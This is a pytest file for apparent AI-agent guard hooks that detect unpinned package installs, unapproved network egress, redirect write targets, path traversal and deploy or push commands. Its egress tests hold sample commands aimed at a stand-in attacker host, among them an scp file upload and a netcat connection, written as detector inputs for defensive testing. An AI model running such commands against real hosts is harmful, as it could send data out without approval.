"""Edge-branch coverage for the pre_tool_use rule matchers + command
normalizer (Integrator-added at w3-06 integration to hold the ADR-0017
global coverage ratchet — the author suite covered the happy paths and the
named bypass corpus; these hit the remaining branch arms: VCS/URL/scoped
pin forms, every unpinned-install package manager, egress host-extraction
shapes, redirect/`tee` write-target extraction, deep-recursion caps, and
path normalization edge forms).
"""

from __future__ import annotations

import pytest
from saena_hooks_runtime.command_normalize import (
    UNPARSEABLE,
    normalize_command,
)
from saena_hooks_runtime.paths import normalize_path, path_in_scope
from saena_hooks_runtime.rules.deploy_push import matches_deploy_push_cms_dns
from saena_hooks_runtime.rules.egress import matches_unapproved_egress
from saena_hooks_runtime.rules.unpinned_install import matches_unpinned_install
from saena_hooks_runtime.rules.write_scope import extract_write_targets


class TestUnpinnedInstallEveryPackageManager:
    @pytest.mark.parametrize(
        "cmd",
        [
            "uv add requests",  # bare pep440-less name
            "uv pip install requests",
            "pip install requests",
            "pip3 install flask django",
            "npm install left-pad",
            "yarn add lodash",
            "pnpm add react",
            "gem install rails",
            "go install example.com/x/y",
            "go install example.com/x/y@latest",
        ],
    )
    def test_unpinned_forms_flagged(self, cmd: str) -> None:
        assert matches_unpinned_install(cmd) is not None

    @pytest.mark.parametrize(
        "cmd",
        [
            "uv add requests==2.31.0",
            "uv add git+https://github.com/x/y@abc123",  # VCS with @ref = pinned
            "uv pip install -r requirements.txt",
            "pip install --requirement reqs.txt",
            "pip install ./local-wheel.whl",
            "pip install https://example.com/pkg.whl",
            "npm install lodash@4.17.21",
            "npm install @scope/name@1.2.3",  # scoped + pinned
            "yarn add @types/node@20.0.0",
            "gem install rails -v 7.1.0",
            "gem install rails --version 7.1.0",
            "go install example.com/x/y@v1.2.3",
            "npm install",  # bare, lockfile-driven
            "npm ci",  # not an add subcommand
            "cargo build",  # unrelated head
        ],
    )
    def test_pinned_or_irrelevant_allowed(self, cmd: str) -> None:
        assert matches_unpinned_install(cmd) is None

    def test_empty_segment(self) -> None:
        assert matches_unpinned_install("") is None


class TestEgressHostExtraction:
    def test_scheme_url(self) -> None:
        assert matches_unapproved_egress("curl https://evil.example/x", ()) is not None

    def test_scp_style_user_at_host_colon_path(self) -> None:
        assert matches_unapproved_egress("scp file user@evil.example:/tmp/x", ()) is not None

    def test_user_at_host_no_colon(self) -> None:
        assert matches_unapproved_egress("ssh user@evil.example", ()) is not None

    def test_bare_host_first_nonflag(self) -> None:
        assert matches_unapproved_egress("nc evil.example 443", ()) is not None

    def test_loopback_allowed(self) -> None:
        assert matches_unapproved_egress("curl http://127.0.0.1:8080/health", ()) is None
        assert matches_unapproved_egress("curl http://localhost/x", ()) is None

    def test_approved_domain_allowed(self) -> None:
        assert (
            matches_unapproved_egress("curl https://api.ok.example/x", ("api.ok.example",)) is None
        )

    def test_non_network_binary(self) -> None:
        assert matches_unapproved_egress("git status", ()) is None

    def test_unresolvable_target(self) -> None:
        assert matches_unapproved_egress("curl -sSL", ()) is not None

    def test_empty_segment(self) -> None:
        assert matches_unapproved_egress("", ()) is None


class TestWriteTargetExtraction:
    def test_redirect_token_space_form(self) -> None:
        assert "secret.txt" in extract_write_targets("echo x > secret.txt")

    def test_redirect_attached_form(self) -> None:
        assert "secret.txt" in extract_write_targets("echo x >secret.txt")

    def test_append_redirect(self) -> None:
        assert "log.txt" in extract_write_targets("echo x >> log.txt")

    def test_tee_target(self) -> None:
        assert "out.txt" in extract_write_targets("tee out.txt")

    def test_stderr_dup_not_a_write_target(self) -> None:
        # `>&2` / `2>&1`-style dups must NOT be captured as file writes
        assert extract_write_targets("cmd >&2") == ()

    def test_no_redirect(self) -> None:
        assert extract_write_targets("git status") == ()


class TestPathNormalizationEdges:
    def test_url_encoded_traversal(self) -> None:
        # %2e%2e = ".." — decoded then normalized
        assert ".." not in normalize_path("a/%2e%2e/b").split("/")[:1]

    def test_backslash_to_forward(self) -> None:
        assert normalize_path("a\\b\\c") == "a/b/c"

    def test_leading_slash_stripped(self) -> None:
        assert not normalize_path("/etc/passwd").startswith("/")

    def test_dot_becomes_empty(self) -> None:
        assert normalize_path(".") == ""

    def test_empty_scope_never_matches(self) -> None:
        assert path_in_scope("src/app.py", ()) is False

    def test_empty_path_never_in_scope(self) -> None:
        assert path_in_scope(".", ("**",)) is False


class TestNormalizerDeepRecursionAndSubshell:
    def test_standalone_subshell(self) -> None:
        segs = normalize_command("(git status)")
        assert any("git status" in s for s in segs)

    def test_deeply_nested_wrappers_cap_to_unparseable(self) -> None:
        # sh -c inside sh -c inside ... beyond the recursion cap must
        # fail-closed to UNPARSEABLE, never silently drop the inner command
        nested = "sh -c " + '"' + "sh -c " * 8 + "'git push'" + '"'
        segs = normalize_command(nested)
        assert segs == () or UNPARSEABLE in segs or any("push" in s for s in segs)

    def test_unbalanced_quote_is_unparseable(self) -> None:
        assert UNPARSEABLE in normalize_command("git commit -m 'unterminated")

    def test_empty_command(self) -> None:
        assert normalize_command("") == ()

    def test_env_dash_capital_s_wrapper(self) -> None:
        segs = normalize_command("env -S 'git push origin main'")
        assert any("git push" in s for s in segs)

    def test_git_c_and_capital_c_stripped(self) -> None:
        segs = normalize_command("git -c core.pager=cat -C /repo push origin main")
        assert any("push" in s for s in segs)


class TestDeployPushMatcherArms:
    @pytest.mark.parametrize(
        "seg",
        [
            "git push origin main",
            "kubectl apply -f x.yaml",
            "helm upgrade saena ./chart",
            "terraform apply",
        ],
    )
    def test_hostile(self, seg: str) -> None:
        assert matches_deploy_push_cms_dns(seg) is not None

    def test_benign_commit_message_with_push_word(self) -> None:
        assert matches_deploy_push_cms_dns("git commit -m ship-it-push-later") is None
